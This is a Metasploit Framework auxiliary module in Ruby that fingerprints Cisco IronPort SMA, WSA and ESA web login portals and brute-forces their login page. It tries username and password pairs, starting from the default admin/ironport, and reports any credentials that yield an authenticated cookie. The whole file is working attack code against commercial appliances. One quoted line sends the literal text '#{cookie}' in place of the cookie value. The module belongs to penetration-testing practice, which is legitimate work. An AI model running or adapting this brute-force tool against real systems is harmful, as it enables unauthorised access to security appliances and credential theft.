##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'rex/proto/http'
require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Cisco Ironport Bruteforce Login Utility',
      'Description'    => %{
        This module scans for Cisco Ironport SMA, WSA and ESA web login portals, finds AsyncOS
        versions, and performs login brute force to identify valid credentials.
      },
      'Author'         =>
        [
          'Karn Ganeshen <KarnGaneshen[at]gmail.com>',
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        Opt::RPORT(443),
        OptBool.new('SSL', [true, "Negotiate SSL for outgoing connections", true]),
        OptString.new('USERNAME', [true, "A specific username to authenticate as", "admin"]),
        OptString.new('PASSWORD', [true, "A specific password to authenticate with", "ironport"])
      ], self.class)
  end

  def run_host(ip)
    unless check_conn?
      print_error("#{rhost}:#{rport} - Connection failed, Aborting...")
      return
    end

    unless is_app_ironport?
      print_error("#{rhost}:#{rport} - Application does not appear to be Cisco Ironport. Module will not continue.")
      return
    end

    print_status("#{rhost}:#{rport} - Starting login brute force...")
    each_user_pass do |user, pass|
      do_login(user, pass)
    end
  end

  def check_conn?
    begin
      res = send_request_cgi(
      {
        'uri'       => '/',
        'method'    => 'GET'
      })
      print_good("#{rhost}:#{rport} - Server is responsive...")
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
      return
    end
  end

  #
  # What's the point of running this module if the app actually isn't Cisco IronPort
  #

  def is_app_ironport?
      res = send_request_cgi(
      {
        'uri'       => '/',
        'method'    => 'GET'
      })

      if (res and res.headers['Set-Cookie'])

        cookie = res.headers['Set-Cookie'].split('; ')[0]

        res = send_request_cgi(
        {
          'uri'       => "/help/wwhelp/wwhimpl/common/html/default.htm",
          'method'    => 'GET',
          'cookie'	   => '#{cookie}'
        })

        if (res and res.code == 200 and res.body.include?('Cisco IronPort AsyncOS'))
          version_key = /Cisco IronPort AsyncOS (.+? )/
          version = res.body.scan(version_key).flatten[0].gsub('"','')
          product_key = /for (.*)</
          product = res.body.scan(product_key).flatten[0]

          if (product == 'Security Management Appliances')
            p_name = 'Cisco IronPort Security Management Appliance (SMA)'
            print_good("#{rhost}:#{rport} - Running Cisco IronPort #{product} (SMA) - AsyncOS v#{version}")
          elsif ( product == 'Cisco IronPort Web Security Appliances' )
            p_name = 'Cisco IronPort Web Security Appliance (WSA)'
            print_good("#{rhost}:#{rport} - Running #{product} (WSA) - AsyncOS v#{version}")
          elsif ( product == 'Cisco IronPort Appliances' )
            p_name = 'Cisco IronPort Email Security Appliance (ESA)'
            print_good("#{rhost}:#{rport} - Running #{product} (ESA) - AsyncOS v#{version}")
          end

          return true
        else
          return false
        end
      else
        return false
      end
  end

  #
  # Brute-force the login page
  #

  def do_login(user, pass)
    vprint_status("#{rhost}:#{rport} - Trying username:#{user.inspect} with password:#{pass.inspect}")
    begin
      res = send_request_cgi(
      {
        'uri'       => '/login',
        'method'    => 'POST',
        'vars_post' =>
          {
            'action' => 'Login',
            'referrer' => '',
            'screen' => 'login',
            'username' => user,
            'password' => pass
          }
      })

      if (res and res.headers['Set-Cookie'].include?('authenticated='))
        print_good("#{rhost}:#{rport} - SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}")

        report_hash = {
          :host   => rhost,
          :port   => rport,
          :sname  => 'Cisco IronPort Appliance',
          :user   => user,
          :pass   => pass,
          :active => true,
          :type => 'password'
        }

        report_auth_info(report_hash)
        return :next_user

      else
        vprint_error("#{rhost}:#{rport} - FAILED LOGIN - #{user.inspect}:#{pass.inspect}")
      end

    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
      print_error("#{rhost}:#{rport} - HTTP Connection Failed, Aborting")
      return :abort
    end
  end
end
